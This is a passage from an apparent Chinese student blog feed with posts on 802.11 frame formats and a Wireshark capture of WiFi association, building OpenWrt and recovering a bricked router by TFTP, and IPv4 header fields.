提供标准速度300M，最高速度600M的连接速度</li><li>IEEE 802.11k，该协议规范规定了无线局域网络频谱测量规范。该规范的制订体现了无线局域网络对频谱资源智能化使用的需求。</li></ul><h2 id="802-11协议的发展过程中安全、加密相关的技术"><a href="#802-11协议的发展过程中安全、加密相关的技术" class="headerlink" title="802.11协议的发展过程中安全、加密相关的技术"></a>802.11协议的发展过程中安全、加密相关的技术</h2><ol><li>WEP，Wired Equivalent Privacy: 802.11中最早期的加密标准</li><li>WPA(Wi-Fi Protected Access)</li><li>WPA2(Wi-Fi Protected Access 2)</li></ol><h2 id="802-11数据包种类"><a href="#802-11数据包种类" class="headerlink" title="802.11数据包种类"></a>802.11数据包种类</h2><ol><li>数据: 数据数据包的作用是用来携带更高层次的数据(如IP数据包，ISO7层协议)。<br>它负责在工作站之间传输数据</li><li>管理: 管理数据包控制网络的管理功能<ul><li>信标帧(Beacons): 在无线设备中，定时依次按指定间隔发送的有规律的无线信号(类似心跳包)，主要用于定位和同步使用</li><li>解除认证(Deauthentication)数据包 </li><li>Probe(request and response)</li><li>Authenticate(request and response)</li><li>Associate(request and response)</li><li>Reassociate(request and response)</li><li>Dissassociate(notify)<br>管理帧负责监督，主要用来加入或退出无线网络，以及处理接入点之间连接的转移事宜</li></ul></li><li>控制: 控制数据包得名于术语”媒体接入控制(Media Access Control, MAC)”，是用来控制对共享媒体(即物理媒介，如光缆)的访问<ul><li>请求发送(Request To Send，RTS)数据包</li><li>清除发送(Clear To Send，CTS)数据包</li><li>ACK确认(RTS&#x2F;CTS)  </li><li>PS-Poll: 当一部移动工作站从省电模式中苏醒，便会发送一个 PS-Poll 帧给基站，以取得任何暂存帧<br>控制帧通常与数据帧搭配使用，负责区域的清空、信道的取得以及载波监听的维护，并于收到数据时予以正面的应答，借此促进工作站间数据传输的可靠性</li></ul></li></ol><h2 id="802-11基本元素"><a href="#802-11基本元素" class="headerlink" title="802.11基本元素"></a>802.11基本元素</h2><ul><li><p>基本服务集（Basic Service Set，简称BSS）是802.11网络的基本组件，由一组相互通信的工作站所构成。工作站之间的通信在某个模糊地带进行着，称为基本服务区域 （Basic service area），此区域受限于所使用的无线媒介的传播特性。只要位于基本 服务区域，工作站就可以跟同一个BSS的其他成员通信。<br><img src="/images/bss.jpg"></p></li><li><p>BSA：BSS的覆盖范围称为基本服务区。 </p></li><li><p>ESS（Extended Service Set）是采用相同的SSID的多个BSS形成的更大规模的虚拟 BSS。</p></li></ul><p><img src="/images/ess.jpg"></p><ul><li>SSID是Service Set Identifier的缩写，意思是：服务集标识。SSID技术可以将一个无线 局域网分为几个需要不同身份验证的子网络，每一个子网络都需要独立的身份验证，只 有通过身份验证的用户才可以进入相应的子网络，防止未被授权的用户进入本网络。 </li><li>BSSID实际上就是AP的MAC地址，用来标识AP管理的BSS，在同一个AP内BSSID和 SSID一一映射。在一个ESS内SSID是相同的，但对于ESS内的每个AP与之对应的 BSSID是不相同的。如果一个AP可以同时支持多个SSID的话，则AP会分配不同的 BSSID来对应这些SSID。</li></ul><h2 id="802-11协议格式"><a href="#802-11协议格式" class="headerlink" title="802.11协议格式"></a>802.11协议格式</h2><p>我们知道数据链路层是一个很靠近底层的通信协议，它使用Bit来表示信息(也使用Bit来标识数据包的开始和结束)，所以数据链路层的协议格式并没有强制要求一个固定的长度，即802.11协议长度是可变的。不同功能的数据帧长度会不一样。这一特性说明mac802.11数据帧显得更加灵活，然而，也会更加复杂。</p><p>mac 802.11的数据帧长度不定主要是由于以下几点决定的：</p><ol><li>mac地址数目不定，根据帧类型不同，mac 802.11的mac地址数会不一样。比如说 ACK帧仅有一个mac地址，而数据帧有3个mac地址，在WDS模式下，帧头有4个mac地址。</li><li>802.11的管理帧所携带的信息长度不定，在管理帧中，不仅仅只有一些类似于mac地址，分片标志之类的这些信息，而且另外还会包括一些其它的信息，这些信息有关于安全设置的，有关于物理<br>通信的，比如说我们的SSID名称就是通过管理帧获得的。AP会根据不同的情况发送包含有不同信息的管理帧。 </li><li>加密(wep,wpa等)信息，QOS(quality of service)信息，若有加密的数据帧格式和没有加密的数据帧格式还不一样，加密数据帧格式还多了个加密头，用于解密用。</li></ol><h3 id="管理帧协议格式"><a href="#管理帧协议格式" class="headerlink" title="管理帧协议格式"></a>管理帧协议格式</h3><ol><li><p>Beacon(信标)帧<br><img src="/images/beacon.jpg"></p></li><li><p>Probe Request(探测请求)帧<br>![](&#x2F;images&#x2F;Probe Request.jpg)</p></li><li><p>Probe Response(探测响应)帧<br>![](&#x2F;images&#x2F;Probe Response.jpg)</p></li><li><p>ATIM帧<br><img src="/images/ATIM.jpg"></p></li><li><p>Disassociation(解除关联)与Deauthentication(解除认证)帧<br><img src="/images/Deauthentication.jpg"></p></li><li><p>Association Request(关联请求)帧<br><img src="/images/Association.jpg"></p></li><li><p>Reassociation Request(重新关联请求)帧<br><img src="/images/Reassociation.jpg"></p></li><li><p>Authentication(身份认证)帧<br><img src="/images/Authentication.jpg"></p></li><li><p>帧控制结构(Frame Control)</p></li></ol><ol><li>Protocol Version: (协议版本)通常为0</li><li>Type: 帧类型，管理帧: 00 </li><li>Subtype: 进一步判断帧的子类型<br> 3.1) Beacon(信标)帧<br> 3.2) Probe Request(探测请求)帧<br> 3.3) Probe Response(探测响应)帧<br> 3.4) ATIM帧<br> 3.5) Disassociation(解除关联)<br> 3.6) Deauthentication(解除认证)帧<br> 3.7) Association Request(关联请求)帧<br> 3.8) Reassociation Request(重新关联请求)帧<br> 3.9) Authentication(身份认证)帧</li><li>To DS: 表明该帧是否是BSS向DS发送的帧 </li><li>From DS: 表明该帧是否是DS向BSS发送的帧 </li><li>More Fragment: 用于说明长帧被分段的情况，是否还有其它的帧，如果有则该值设置为1</li><li>Retry(重传域): 表示该分段是先前传输分段的重发帧。 </li><li>Power Management: 表示传输帧以后，站所采用的电源管理模式<br> 8.1) 为1: STA处于power_save模式<br> 8.2) 为0: STA处于active模式</li><li>More Data: 表示有很多帧缓存到站中。即至少还有一个数据帧要发送给STA是设置为1。 </li><li>Protected Frame: 表示根据WEP(Wired Equivalent Privacy)算法对帧主体进行加密。如果帧体部分包含被密钥套处理过的数据，则设置为1，否则设置为0 </li><li>Order(序号域): 在长帧分段传送时，该域设置为1表示接受者应该严格按照顺序处理该帧，否则设置为0</li></ol><ol start="2"><li><p>Duration&#x2F;ID(持续时间&#x2F;标识)<br>表明该帧和它的确认帧将会占用信道多长时间，Duration 值用于网络分配向量(NAV)计算 </p></li><li><p>Address Fields(地址域): </p><ol><li>Destination Address</li><li>Source Address</li><li>BSS ID</li></ol></li><li><p>Sequence Control(序列控制域): 用于过滤重复帧</p><ol><li>MSDU(MAC Server Data Unit), 12位序列号(Sequence Number)</li><li>MMSDU(MAC Management Server Data Unit), 4位片段号(Fragment Number)组成</li></ol></li><li><p>Frame Body(Data): 发送或接收的信息。对于不同类型的数据帧来说，这个域的格式差别较大</p></li></ol><ol><li>Beacon(信标)帧<br> 1.1) Timestamp(时戳)位: 可用来同步 BSS 中的工作站 BSS 的主计时器会定期发送目前已作用的微秒数。当计数器到达最大值时，便会从头开始计数<br> 1.2) Beacon interval位: AP点每隔一段时间就会发出的Beacon(信标)信号，用来宣布 802.11网络的存在。我们打开无线连接的时候之所以能看到很多Wi-Fi点就是因为它<br> 1.3) Capability information位: 发送Beacon信号的时候，它被用来通知各方，该网络具备哪种性能<br> 1.4) SSID服务集标识(Service Set Identity): 由字节所形成的字串，用来标示所属网络的BSSID，即我们在Wi-Fi连接前看到的接入点名称<br> 1.5) 跳频参数组合(PH Parameter Set): 包含了加入 802.11跳频(frequency-hopping)网络所需要的参数<br> 1.6) 直接序列参数集合(DS Parameter Set): 指明网络所使用的信道数<br> 1.7) 免竞争参数集合(CF Parameter Set): 出现在支持免竞争接入点所发送的 Beacon帧中，并非必须<br> 1.8) IBSS 参数集合(IBSS Parameter Set): 指明ATIM window (数据待传指示通知信息间隔期间)<br> 1.9) TIM数据待传信息(Traffic Indication Map): 指示有哪些工作站需要接收待传数据<br> 1.10) Country: 国家识别码<br> 1.11) 功率限制(Power Constraint): 让网络得以向工作站传达其所允许的最大传输功率<br> 1.12) 信道切换宣告(Channel Switch Announcement): 为了警告网络中的工作站即将变换信道<br> 1.13) 禁声(Quiet): 为了避免与特定的军事雷达技术彼此干扰<br> 1.14) 发射功率控制报告(TPC Report): 指明链路的衰减情况，可以帮助工作站了解该如何调整传输功率<br> 1.15) 扩展物理层(ERP)<br> 1.16) 支持速率(Supported Rates): 无线局域网络支持数种标准速率。当移动工作站试图加入网络，会先检视该网络所使用的数据速率。有些速率是强制性的，每部工作站都必须支持,有些则是选择性的<br> 1.17) RSN强健安全网络(Robust Security Network)</li><li>Probe Request(探测请求)帧<br> 2.1) SSID服务集标识(Service Set Identity): 由字节所形成的字串，用来标示所属网络的BSSID，即我们在Wi-Fi连接前看到的接入点名称<br> 2.2) Supported Rate(支持速率)<br> 2.3) 扩展支持速率(Extended Supported Rate)</li><li>Probe Response(探测响应)帧<br> 3.1) Timestamp(时戳)位: 可用来同步 BSS 中的工作站 BSS 的主计时器会定期发送目前已作用的微秒数。当计数器到达最大值时，便会从头开始计数<br> 3.2) Beacon interval位: AP点每隔一段时间就会发出的Beacon(信标)信号，用来宣布 802.11网络的存在。我们打开无线连接的时候之所以能看到很多Wi-Fi点就是因为它<br> 3.3) Capability information位: 发送Beacon信号的时候，它被用来通知各方，该网络具备哪种性能<br> 3.4) SSID服务集标识(Service Set Identity): 由字节所形成的字串，用来标示所属网络的BSSID，即我们在Wi-Fi连接前看到的接入点名称<br> 3.5) 支持速率(Supported Rates): 无线局域网络支持数种标准速率。当移动工作站试图加入网络，会先检视该网络所使用的数据速率<br> 3.6) 跳频参数组合(PH Parameter Set): 包含了加入 802.11跳频(frequency-hopping)网络所需要的参数<br> 3.7) 直接序列参数集合(DS Parameter Set): 指明网络所使用的信道数<br> 3.8) 免竞争参数集合(CF Parameter Set): 出现在支持免竞争接入点所发送的 Beacon帧中，并非必须<br> 3.9) IBSS 参数集合(IBSS Parameter Set): 指明ATIM window (数据待传指示通知信息间隔期间)<br> 3.10) Country: 国家识别码<br> 3.11) FH Hopping Parameters<br> 3.12) FH Pattern Table<br> 3.13) 功率限制(Power Constraint): 让网络得以向工作站传达其所允许的最大传输功率<br> 3.13) 信道切换宣告(Channel Switch Announcement): 为了警告网络中的工作站即将变换信道<br> 3.14) 禁声(Quiet): 为了避免与特定的军事雷达技术彼此干扰<br> 3.15) IBSS 动态选项(IBSS DFS):在 IBSS 中负责动态选频的工作站可以在管理帧中传递 IBSS DFS 信息元素<br> 3.16) 发射功率控制报告(TPC Report): 指明链路的衰减情况，可以帮助工作站了解该如何调整传输功率<br> 3.17) 扩展物理层(ERP)<br> 3.18) 扩展支持速率(Extended Supported Rate)<br> 3.19) RSN强健安全网络(Robust Security Network)</li><li>ATIM帧</li><li>Disassociation(解除关联)<br> 5.1) Beacon Code</li><li>Deauthentication(解除认证)帧<br> 6.1) Beacon Code</li><li>Association Request(关联请求)帧<br> 7.1) Capability information位: 发送Beacon信号的时候，它被用来通知各方，该网络具备哪种性能<br> 7.2) Listen interval位: 为了节省电池的电力，工作站可以暂时关闭 802.11网络接口的天线。当工作站处于休眠状态，接入点必须为之暂存帧<br> 7.3) SSID服务集标识(Service Set Identity): 由字节所形成的字串，用来标示所属网络的BSSID，即我们在Wi-Fi连接前看到的接入点名称<br> 7.4) Supported Rate(支持速率)</li><li>Reassociation Request(重新关联请求)帧<br> 8.1) Capability information位: 发送Beacon信号的时候，它被用来通知各方，该网络具备哪种性能<br> 8.2) Listen interval位: 为了节省电池的电力，工作站可以暂时关闭 802.11网络接口的天线。当工作站处于休眠状态，接入点必须为之暂存帧<br> 8.3) Current AP Address位: 使用Current AP Address(目前接入点的地址)位来表明目前所连接的接入点的 MAC地址<br> 8.4) SSID服务集标识(Service Set Identity): 由字节所形成的字串，用来标示所属网络的BSSID，即我们在Wi-Fi连接前看到的接入点名称<br> 8.5) Supported Rate(支持速率)</li><li>Authentication(身份认证)帧<br> 9.1) Authentication Algorithm Number: 指明认证程序所使用的认证类型<br> 9.2) Authentication Transaction Sequence Number: 用以追踪身份认证的进度<br> 9.3) Status Code: 状态代码用来表示某项过程成功或失败<br> 9.4) 质询口令(Challenge Text): 802.11所定义的共享密钥身份认证系统。会要求移动工作站必须成功解码一段加密过的质询口令。这段质询口令的发送系通过 Challenge Text(质询口令)信息元素</li></ol><ol start="6"><li>FCS(CRC): 包括32位的循环冗余校验(CRC)，用于检错，注意是检错不是纠错</li></ol><h1 id="WiFi连接交互过程"><a href="#WiFi连接交互过程" class="headerlink" title="WiFi连接交互过程"></a>WiFi连接交互过程</h1><p><strong>有了802.11协议的基本格式之后，我们可以使用wireshark进行抓包实验，验证一下我们的理论</strong><br>启动无线网卡的Monotor模式，前面文章里面有讲过，然后启动wireshark，选择wlan0mon网卡即可。</p><h2 id="AP发送Beacon广播管理帧"><a href="#AP发送Beacon广播管理帧" class="headerlink" title="AP发送Beacon广播管理帧"></a>AP发送Beacon广播管理帧</h2><p><img src="/images/zhuabao1.png"></p><p>因为AP发送的这个Beacon管理帧数据包是广播地址，所以我们的PCMIA内置网卡、或者USB外界网卡会接收到这个数据包，然后在我们的”无线连接列表”中显示出来：<br><img src="/images/wlan.png"></p><h2 id="客户端向承载指定SSID的AP发送Probe-Request-探测请求-帧"><a href="#客户端向承载指定SSID的AP发送Probe-Request-探测请求-帧" class="headerlink" title="客户端向承载指定SSID的AP发送Probe Request(探测请求)帧"></a>客户端向承载指定SSID的AP发送Probe Request(探测请求)帧</h2><p><img src="/images/zhuabao2.png"></p><p>当我们点击”连接”的时候，无线网卡就会发送一个Prob数据帧，用来向AP请求连接</p><h2 id="AP接入点对客户端的SSID连接请求进行应答"><a href="#AP接入点对客户端的SSID连接请求进行应答" class="headerlink" title="AP接入点对客户端的SSID连接请求进行应答"></a>AP接入点对客户端的SSID连接请求进行应答</h2><p><img src="/images/zhuabao3.png"></p><p>AP对客户端的连接作出了回应。</p><h2 id="客户端对目标AP请求进行身份认证-Authentication"><a href="#客户端对目标AP请求进行身份认证-Authentication" class="headerlink" title="客户端对目标AP请求进行身份认证(Authentication)"></a>客户端对目标AP请求进行身份认证(Authentication)</h2><p>这个包没有抓到……</p><h2 id="AP对客户端的身份认证-Authentication-请求作出回应"><a href="#AP对客户端的身份认证-Authentication-请求作出回应" class="headerlink" title="AP对客户端的身份认证(Authentication)请求作出回应"></a>AP对客户端的身份认证(Authentication)请求作出回应</h2><p><img src="/images/zhuabao4.png"></p><h2 id="客户端向AP发送连接-Association-请求"><a href="#客户端向AP发送连接-Association-请求" class="headerlink" title="客户端向AP发送连接(Association)请求"></a>客户端向AP发送连接(Association)请求</h2><p><img src="/images/zhuabao5.png"></p><h2 id="AP对连接-Association-请求进行回应"><a href="#AP对连接-Association-请求进行回应" class="headerlink" title="AP对连接(Association)请求进行回应"></a>AP对连接(Association)请求进行回应</h2><p>这个包也没有抓到……</p><p>AP对客户端的连接请求(Association)予以了回应(包括SSID、性能、加密设置等)。至此，Wi-Fi的连接身份认证交互就全部结束了，之后就可以正常进行数据发送了</p><h2 id="客户端向AP请求断开连接-Disassociation"><a href="#客户端向AP请求断开连接-Disassociation" class="headerlink" title="客户端向AP请求断开连接(Disassociation)"></a>客户端向AP请求断开连接(Disassociation)</h2><p>这个也没抓到对应数据报。</p><p><img src="/images/woshou.png"></p><p>**由此，我们可以发现，基于对数据帧格式的了解，黑客可以发起一些针对协议的攻击 **前面几篇文章介绍过几种无线DoS的攻击，其中Deanthentication攻击，Disassociation攻击基于协议的攻击。</p>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
      <tag>协议</tag>
      
      <tag>802.11</tag>
      
      <tag>无线网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OpenWrt探索之路（一）</title>
    <link href="/blog/2018/10/29/OpenWrt%E6%8E%A2%E7%B4%A2%E4%B9%8B%E8%B7%AF%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/blog/2018/10/29/OpenWrt%E6%8E%A2%E7%B4%A2%E4%B9%8B%E8%B7%AF%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>漫长的国创项目之路开始了第一步，在学长的指导下，我开始学习OpenWrt这个开源的路由器系统，来设计我们新的路由器协议，简单总结一下这周学的东西，方便以后自己查阅。</strong></p><p><img src="/images/bxb.png"></p><span id="more"></span><h2 id="OpenWrt系统的安装"><a href="#OpenWrt系统的安装" class="headerlink" title="OpenWrt系统的安装"></a>OpenWrt系统的安装</h2><ul><li><p>首先，我们需要确认所有的依赖软件已安装。下面以Debian&#x2F;Ubuntu为例：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install subversion g++ zlib1g-<span class="hljs-built_in">dev</span> build-essential git python rsync man-db<br>sudo apt-<span class="hljs-built_in">get</span> install libncurses5-<span class="hljs-built_in">dev</span> gawk gettext unzip file libssl-<span class="hljs-built_in">dev</span> wget zip time<br></code></pre></td></tr></table></figure></li><li><p>接下来，使用以下命名获取OpenWrt的源代码： </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/openwrt/</span>openwrt.git<br>cd openwrt<br></code></pre></td></tr></table></figure><p>这里找了好多源，官网上给的源无法git，会出现错误，只好使用Github上面的源。</p></li><li><p>下载完OpenWrt的源码后，为了使OpenWrt支持更多的软件，需要更新和安装其它源上面的软件。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/scripts/</span>feeds update -a<br>.<span class="hljs-regexp">/scripts/</span>feeds install -a<br></code></pre></td></tr></table></figure><p>这里还是会出现无法更新的问题，还是源的问题，这里还是把目录下的feeds.conf.default文件打开，修改其中的源：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">src-git packages https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/openwrt/</span>packages.git<br>src-git luci https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/openwrt/</span>luci.git<br>src-git routing https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/openwrt-routing/</span>packages.git<br>src-git telephony https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/openwrt/</span>telephony.git<br></code></pre></td></tr></table></figure></li><li><p>最后一个命令就是打开菜单配置你想编译出来的功能和路由器型号等等：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make menuconfig</span><br></code></pre></td></tr></table></figure><p>就拿我手上现有的NETGEAR WNDR4300来说：</p></li></ul><p> Target System —&gt; Atheros AR7xxx&#x2F;AR9xxx<br> Subtarget —&gt; Generic devices with NAND flash<br> Target Profile —&gt; NETGEAR WNDR4300v1  </p><p>然后退出并选择保存。<br>由于具体的config中的配置我还没去了解，所以具体的config的配置将会在下一篇博客写出。</p><ul><li>编译：<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">make FORCE\_UNSAFE\<span class="hljs-attribute">_CONFIGURE</span>=1 -j N <span class="hljs-attribute">V</span>=s<br><br></code></pre></td></tr></table></figure>说明一下，make的时候记得加系统变量FORCE_UNSAFE_CONFIGURE&#x3D;1 这样就不会报错了（错误信息里面给的，至于为什么我也不是很清楚）。-j N中N为CPU内核数+1，这种方法可以加快编译速度，但是容易出错。如果遇到编译错误，在没有-j N的情况下再次编译。建议在并行编译之前使用make download命令以防止出现这些错误（对于那些拥有更快Internet连接的用户来说，使用-jN命令在下载环节通常可以更安全）。V&#x3D;s是显示详细信息。</li></ul><p><strong>到此，Openwrt的大致安装和编译过程介绍完毕。</strong></p><h2 id="路由器救砖之路"><a href="#路由器救砖之路" class="headerlink" title="路由器救砖之路"></a>路由器救砖之路</h2><p>咳咳咳，原本以为自己直接make编译出了相应的刷机文件，刷进路由器就可以使用最简单的功能了呢，结果很不幸，路由器变成了一块板砖（具体原因推测是config文件配置问题，少选了很多东西）。于是就出现了下面的救砖之路……<br>此次使用的是TFTP刷机：</p><ol><li>首先，下载需要的固件以及Tftp软件<br>下载固件（需解压）： <a href="http://www.downloads.netgear.com/files/GDC/WNDR4300/WNDR4300_V1.0.1.60.zip">http://www.downloads.netgear.com/files/GDC/WNDR4300/WNDR4300_V1.0.1.60.zip</a><br>TFTP软件这里我使用的是Tftpd，读者可自行网上下载。</li><li>拔掉路由器连接外网的网线，仅保留与电脑的lan口连接，电脑改为固定IP：192.168.1.171（这个随意，固定的就好），子网掩码：255.255.255.0，DNS：192.168.1.1</li><li>按复位键（位于机器底部，用卡针按）不放，此时路由器应处于断电状态</li><li>通电，直到电源指示灯变为绿色并开始闪烁，使用TFTP软件上传固件，服务器IP填写192.168.1.1，稍等5分钟，然后关闭路由器电源，再打开。电脑改为DHCP自动获取IP地址，稍等几分钟路由器便会正常启动，然后浏览器键入192.168.1.1进入路由器后台管理界面即可。</li></ol><h2 id="OpenWrt系统源码目录概述"><a href="#OpenWrt系统源码目录概述" class="headerlink" title="OpenWrt系统源码目录概述"></a>OpenWrt系统源码目录概述</h2><h3 id="原始目录"><a href="#原始目录" class="headerlink" title="原始目录"></a>原始目录</h3><p>下载源码后,源文件如下图所示,下面我们来一一解释：</p><p><img src="/images/openwrt1.png"></p><ol><li>scripts<br>存放了一些脚本,使用了bash,python,perl等多种脚本语言.编译过程中,用于第三方软件包管理的feeds文件也是在这个目录当中.在编译过程中,使用到的脚本也统一放在这个目录中。</li><li>tools<br>编译时,主机需要使用一些工具软件,tools 里包含了获取和编译这些工具的命令.软件包里面有Makefile文件,有的还包含了patch.每个Makefile当中都有一句$(eval $(call HostBuild)),这表明编译这个工具是为了在主机上使用的。</li><li>config<br>存放着整个系统的配置文件</li><li>toolchain<br>嵌入式的童鞋应该都知道交叉编译链,这个文件中存放的就是编译交叉编译链的软件包.包括:binutils,gcc,libc等等。</li><li>target<br>openwrt的源码可以编译出各个平台适用的二进制文件,各平台在这个目录里定义了firmware和kernel的编译过程。</li><li>package<br>存放了openwrt系统中适用的软件包,包含针对各个软件包的Makefile。openwrt定义了一套Makefile模板.各软件参照这个模板定义了自己的信息，如软件包的版本、下载地址、编译方式、安装地址等。在二次开发过程中,这个文件夹我们会经常打交道。<br>事实上,通过.&#x2F;scripts&#x2F;feed update -a和.&#x2F;scripts&#x2F;feed install -a的软件包也会存放在这个目录之中。</li><li>include<br>openwrt的Makefile都存放在这里。文件名为 *.mk 。这里的文件上是在Makefile里被include的,类似于库文件.这些文件定义了编译过程。</li><li>其他单个文件：<br>8.1 Makefile:<br>在顶层目录执行make命令的入口文件。<br>8.2 rules.mk<br>定义了Makefile中使用的一些通用变量和函数。<br>8.3 Config.in<br>在include&#x2F;toplevel.mk中我们可以看到,这是和make menuconfig相关联的文件。<br>8.4 feeds.conf.default<br>是下载第三方一些软件包时所使用的地址。<br>8.5 LICENSE &amp; README<br>即软件许可证和软件基本说明.其中README描述了编译软件的基本过程和依赖文件。</li></ol><h3 id="生成目录"><a href="#生成目录" class="headerlink" title="生成目录"></a>生成目录</h3><p>在我们编译完成后除了下载的源码文件,多出来的部分很明显就是编译过程中新生成的.如下图: </p><p><img src="/images/openwrt2.png"></p><ol><li>feeds<br>openwrt的附加软件包管理器的扩展包索引目录.有点绕,简单来说就是下载管理软件包的。默认的feeds下载有packages、management、luci、routing、telephony。如要下载其他的软件包，需打开源码根目录下面的feeds.conf.default文件，去掉相应软件包前面的#号，然后更新源:<br>.&#x2F;scripts&#x2F;feeds update -a<br>安装下载好的包:<br>.&#x2F;scripts&#x2F;feeds install -a</li><li>build_dir<br>在前面的原始目录中,我们提到了host工具,toolchain工具还有目标文件.openwrt将在这个目录中展开各个软件包,进行编译.所以这个文件夹中包含3个子文件夹:<br>2.1 host<br>在该文件夹中编译主机使用的工具软件<br>2.2 toolchain-XXX<br>在该文件夹中编译交叉工具链<br>2.3 target-XXX<br>在此编译目标平台的目标文件,包括各个软件包和内核文件。</li><li>bin<br>保存编译完成后的二进制文件,包括:完整的bin文件,所有的ipk文件。</li><li>dl<br>在编译过程中使用的很多软件,刚开始下载源码并没有包含,而是在编译过程中从其他服务器下载的,这里是统一的保存目录。</li><li>staging_dir<br>用于保存在build_dir目录中编译完成的软件。所以这里也和build_dir有同样的子目录结构。<br>比如,在target-XXX文件夹中保存了目标平台编译好的头文件,库文件.在我们开发自己的ipk文件时,编译过程中,预处理头文件,链接动态库,静态库都是到这个子文件夹中。</li><li>tmp<br>从名字来看,是临时文件夹.在编译过程中,有大量中间临时文件需要保存,都是在这里。</li><li>logs<br>这个文件夹,有时可以看到,有时没有.这是因为这个文件夹保存的是,编译过程中出错的信息,只有当编译出错了才会出现.我们可以从这里获取信息,从而分析我们的软件编译为什么没有完成。</li></ol><p>这些只是最最基础的对基本目录的了解，以后会更深入地去了解。</p>]]></content>
    
    
    
    <tags>
      
      <tag>路由器系统</tag>
      
      <tag>无线安全</tag>
      
      <tag>OpenWrt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络（二）</title>
    <link href="/blog/2018/10/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/blog/2018/10/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>现在开始了人生中第一个项目，开始为这个项目做出准备了，根据学长的指示，深入了解一下计算机网络工作的原理。</strong></p><p><img src="/images/hxb.png"></p><span id="more"></span><h2 id="计算机网络协议为什么要分层"><a href="#计算机网络协议为什么要分层" class="headerlink" title="计算机网络协议为什么要分层?"></a>计算机网络协议为什么要分层?</h2><ol><li>各层之间相互独立：高层是不需要知道底层的功能是采取硬件技术来实现的，它只需要知道通过与底层的接口就可以获得所需要的服务；</li><li>灵活性好：各层都可以采用最适当的技术来实现，例如某一层的实现技术发生了变化，用硬件代替了软件，只要这一层的功能与接口保持不变，实现技术的变化都并不会对其他各层以及整个系统的工作产生影响； </li><li>易于实现和标准化：由于采取了规范的层次结构去组织网络功能与协议，因此可以将计算机网络复杂的通信过程，划分为有序的连续动作与有序的交互过程，有利于将网络复杂的通信工作过程化解为一系列可以控制和实现的功能模块，使得复杂的计算机网络系统变得易于设计，实现和标准化。</li></ol><h2 id="IP数据报文"><a href="#IP数据报文" class="headerlink" title="IP数据报文"></a>IP数据报文</h2><p>IP协议提供不可靠无连接的数据报传输服务，IP层提供的服务是通过IP层对数据报的封装与拆封来实现的。IP数据报的格式分为报头区和数据区两大部分，其中报头区是为了正确传输高层数据而加的各种控制信息，数据区包括高层协议需要传输的数据。</p><p>IPv4数据报如下图所示：</p><p><img src="/images/ipshujubao.png"></p><h3 id="IP头部字段"><a href="#IP头部字段" class="headerlink" title="IP头部字段"></a>IP头部字段</h3><p>第一个字段（只有四位）是<em>版本字段</em>。它包含IP数据报的版本号：IPv4为4，IPv6为6。IPv4和IPv6头部版本除版本字段位置相同外再无其它是一样的。因此，这两个协议不能直接相互操作，主机或者路由器必须分别处理IPv4和IPv6。</p><p><em>Internet头部长度（IHL）字段</em>保存IPv4头部中32位字的数量，包括任何选项。由于它是一个4位的字段，所以IPv4的头部被限制为最多15个32位字，即60字节。IPv6中不存在这个字段，其头部的长度固定为40字节。</p><p><em>总长度字段</em>是IPV4数据报的总长度，以字节为单位。通过这个字段长度和IHL我们就可以知道数据报的数据部分从哪里开始，以及它的长度。由于它是一个16位的字段，所以IPv4的数据报最大长度（包括头部）为65535字节。</p><p><em>标识字段</em>帮助标识由IPv4主机发送的数据报。为了避免将一个数据报分片和其他数据报分片混淆，发送主机通常在每次发送数据报时都将一个内部计数器加一，并将该计数器值复制到IPv4标识字段。</p><p><em>生存期（TTL）字段</em>用于设置一个数据报可经过的路由器数量上限。发送方将它初始化为某个值（[RFC1122]建议为64，但128或255也不少见），每台路由器在转发该数据报时将该值减1。当这个字段值达到0时，该数据报被丢弃，并使用一个ICMP消息通知发送方。这可以防止由于出现不希望的路由环路而导致数据报在网络中永远循环。</p><p>IPv4头部中的<em>协议字段</em>包含一个数字，表示数据报有效载荷部分的数据类型。最常用的值为17(UDP)和6(TCP)。这提供了多路分解的功能，以便IP协议可用于携带多种协议类型的有效载荷。</p><p><em>头部校验和字段</em>仅计算IPv4头部。理解这一点很重要，因为这意味着IP协议不会检查IPv4数据报有效载荷（例如TCP和UDP数据）的正确性。为了确保IP数据报的有效载荷部分已经正确传输，其它协议必须通过自己的数据完整性检验机制来检查重要数据。IPv6头部没有任何校验字段。</p><h2 id="TCP-x2F-IP中的分解"><a href="#TCP-x2F-IP中的分解" class="headerlink" title="TCP&#x2F;IP中的分解"></a>TCP&#x2F;IP中的分解</h2><p><img src="/images/tcpipfenjie.jpg"></p><h2 id="访问一个网址的过程背后发生的那些事"><a href="#访问一个网址的过程背后发生的那些事" class="headerlink" 